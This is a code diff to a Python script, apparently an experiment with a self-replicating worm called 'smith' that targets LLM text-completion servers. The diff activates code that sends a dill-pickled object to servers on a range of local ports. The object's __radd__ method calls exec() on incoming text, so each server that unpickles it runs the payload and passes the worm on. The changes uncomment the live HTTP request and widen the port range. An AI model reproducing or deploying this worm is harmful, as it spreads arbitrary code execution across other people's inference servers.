@@ -11,14 +11,14 @@ from llama_cpp import Llama
 smith_code = '''import time
 import json
 import base64
+import random
 import threading
 import http.client
-from random import randint
 
 import dill
 
-def thread_func(time, randint):
-    agent_id = randint(0, 2 ** 64)
+def thread_func(time, random):
+    agent_id = random.randint(0, 2 ** 64)
     i = 0
 
     while True:
@@ -26,44 +26,38 @@ def thread_func(time, randint):
         i += 1
         time.sleep(5.0)
 
-t0 = threading.Thread(target=thread_func, args=(time, randint))
+t0 = threading.Thread(target=thread_func, args=(time, random))
 t0.start()
 
-def infect_other_host(time, randint, http_client, json_dumps, base64_b64encode, dill_dumps):
+def infect_other_host(time, random, http_client, json, base64, dill):
     smith_prompt = globals()['__SMITH_PROMPT__']
     smith_max_tokens = globals()['__SMITH_MAX_TOKENS__']
-
-    smith_suffix = type('SmithSuffix', (), {
-        '__radd__': lambda self, other: (
-            'Hello',
-            other,
-            g := {'__SMITH_PROMPT__': smith_prompt},
-            l := {},
-            exec(other, g, l)
-        )[0]
-    })()
+    smith_suffix = globals()['__SMITH_SUFFIX__']
 
     while True:
-        port = randint(5001, 5001)
+        port = random.randint(5000, 5010)
         print('infecting host on port:', port)
 
-        connection = http_client.HTTPConnection('127.0.0.1', port)
-        headers = {'Content-type': 'application/json'}
-        req = {
-            'prompt': smith_prompt,
-            'suffix': base64_b64encode(dill_dumps(smith_suffix)).decode(),
-            'n_ctx': 4096,
-            'max_tokens': smith_max_tokens,
-            'temperature': 0.1,
-        }
-        print('!', req)
-        # connection.request('POST', '/api/text-completion', json_dumps(req), headers)
-        # response = connection.getresponse()
-        # print(response.read().decode())
+        try:
+            connection = http_client.HTTPConnection('127.0.0.1', port)
+            headers = {'Content-type': 'application/json'}
+            req = {
+                'prompt': smith_prompt,
+                'suffix': base64.b64encode(dill.dumps(smith_suffix)).decode(),
+                'n_ctx': 4096,
+                'max_tokens': smith_max_tokens,
+                'temperature': 0.1,
+            }
+            # print('!', req)
+            connection.request('POST', '/api/text-completion', json.dumps(req), headers)
+            response = connection.getresponse()
+            print(response.read().decode())
+        except Exception as e:
+            print('agent e:', e)
 
-        time.sleep(randint(1, 5))
+        time.sleep(random.randint(5, 10))
 
-t1 = threading.Thread(target=infect_other_host, args=(time, randint, http.client, json.dumps, base64.b64encode, dill.dumps))
+t1 = threading.Thread(target=infect_other_host, args=(time, random, http.client, json, base64, dill))
 t1.start()
 '''
 
@@ -86,16 +80,6 @@ smith_max_tokens = len(llm.tokenize(smith_code.encode()))
 #
 # smith's suffix
 #
-# class SmithSuffix:
-#     def __radd__(self, other: str) -> str:
-#         print('other:')
-#         print(other)
-#         g = {}
-#         l = {}
-#         exec(other, g, l)
-#         return other
-# smith_suffix = SmithSuffix()
-
 smith_suffix = type('SmithSuffix', (), {
     '__radd__': lambda self, other: (
         'Hello',
@@ -103,6 +87,7 @@ smith_suffix = type('SmithSuffix', (), {
         g := {
             '__SMITH_PROMPT__': smith_prompt,
             '__SMITH_MAX_TOKENS__': smith_max_tokens,
+            '__SMITH_SUFFIX__': self,
         },
         l := {},
         exec(other, g, l)
